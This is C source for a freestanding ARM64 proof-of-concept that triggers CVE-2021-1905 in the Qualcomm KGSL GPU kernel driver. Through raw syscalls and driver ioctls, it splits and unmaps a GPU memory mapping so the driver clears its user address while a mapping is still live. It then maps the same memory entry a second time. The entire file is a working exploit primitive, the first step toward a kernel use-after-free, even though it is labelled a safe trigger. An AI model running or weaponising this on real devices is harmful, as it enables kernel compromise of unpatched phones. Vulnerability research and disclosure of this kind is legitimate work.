/*
 * kgsl_uaf_trigger.c - CVE-2021-1905 condition 1 (state error), safe trigger.
 *
 *  1. alloc gpuobj, mmap it (VMA1; entry->memdesc.useraddr = m)
 *  2. munmap the middle page -> VMA split into [m,m+0x1000) + [m+0x2000,m+F)
 *     (3.18 __split_vma calls vm_ops->open -> refcount balanced)
 *  3. munmap the tail -> kgsl_gpumem_vm_close clears memdesc.useraddr = 0
 *     even though [m,m+0x1000) still maps the entry  (THE BUG)
 *  4. GPUMEM_GET_INFO -> useraddr == 0 despite a live mapping
 *  5. mmap the same entry again -> get_mmap_entry accepts (fixed would -EBUSY)
 *     -> double mapping of one struct kgsl_mem_entry (condition 1 proven)
 *
 * Refcounts stay balanced (open on split, close per VMA) -> no teardown UAF.
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_uaf_trigger kgsl_uaf_trigger.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
#define SYS_munmap 215
static inline s64 sys2(long n,s64 a,s64 b){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x8):"memory");return x0;}
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_gpumem_alloc_id{u32 id;u32 flags;u64 size;u64 mmapsize;u64 gpuaddr;u64 pad[2];};
#define IOCTL_GPUMEM_ALLOC_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x34,sizeof(struct kgsl_gpumem_alloc_id))
struct kgsl_gpumem_free_id{u32 id;u32 pad;};
#define IOCTL_GPUMEM_FREE_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x35,sizeof(struct kgsl_gpumem_free_id))
struct kgsl_gpumem_get_info{u64 gpuaddr;u32 id;u32 flags;u64 size;u64 mmapsize;u64 useraddr;u64 pad[4];};
#define IOCTL_GPUMEM_GET_INFO IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x36,sizeof(struct kgsl_gpumem_get_info))
void _start(void){
    out("[*] kgsl_uaf_trigger (CVE-2021-1905 condition 1)\n");
    long fd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    out("[1] open = ");outdec(fd);out("\n");
    if(fd<0){sys3(SYS_exit,1,0,0);return;}

    struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
    a.size=0x3000; a.flags=0;
    long r=sys3(SYS_ioctl,fd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
    u64 F=a.mmapsize?a.mmapsize:a.size;
    out("[2] alloc ret=");outdec(r);out(" id=");outdec(a.id);out(" gpu=");outhex(a.gpuaddr);out(" footprint=");outhex(F);out("\n");
    if(r||!a.id){sys3(SYS_exit,1,0,0);return;}

    s64 m=sys6(SYS_mmap,0,F,3,1,fd,(s64)((u64)a.id<<12));
    out("[3] mmap#1 = ");outhex((u64)m);out("\n");
    if(m<=0){sys3(SYS_exit,1,0,0);return;}

    struct kgsl_gpumem_get_info gi; for(u64 i=0;i<sizeof(gi);i++)((u8*)&gi)[i]=0; gi.id=a.id;
    r=sys3(SYS_ioctl,fd,IOCTL_GPUMEM_GET_INFO,(s64)&gi);
    out("[4] get_info ret=");outdec(r);out(" useraddr=");outhex(gi.useraddr);out(" (expect mapping addr)\n");

    /* split: hole in the middle */
    r=sys2(SYS_munmap,(s64)(m+0x1000),0x1000);
    out("[5] munmap middle ret=");outdec(r);out("\n");
    /* close the tail VMA -> bug: clears useraddr while [m,m+0x1000) remains */
    r=sys2(SYS_munmap,(s64)(m+0x2000),(s64)(F-0x2000));
    out("[6] munmap tail ret=");outdec(r);out("\n");

    for(u64 i=0;i<sizeof(gi);i++)((u8*)&gi)[i]=0; gi.id=a.id;
    r=sys3(SYS_ioctl,fd,IOCTL_GPUMEM_GET_INFO,(s64)&gi);
    out("[7] get_info after tail-close: ret=");outdec(r);out(" useraddr=");outhex(gi.useraddr);
    out(gi.useraddr==0?"  <== STATE ERROR (cleared while VMA [m,m+0x1000) still maps)\n":"  (not cleared)\n");

    /* remap the entry (should be -EBUSY on fixed kernels) */
    s64 m2=sys6(SYS_mmap,0,F,3,1,fd,(s64)((u64)a.id<<12));
    out("[8] mmap#2 (same entry) = ");outhex((u64)m2);
    out(m2>0?"  <== DOUBLE MAPPING (condition 1 CONFIRMED)\n":"  <== rejected (fixed?)\n");

    if(m2>0) sys2(SYS_munmap,m2,(s64)F);
    sys2(SYS_munmap,m,(s64)0x1000);
    struct kgsl_gpumem_free_id f; f.id=a.id; f.pad=0;
    r=sys3(SYS_ioctl,fd,IOCTL_GPUMEM_FREE_ID,(s64)&f);
    out("[9] cleanup ret=");outdec(r);out("\n");
    out("[*] done (refcounts balanced)\n");
    sys3(SYS_close,fd,0,0);
    sys3(SYS_exit,0,0,0);
}
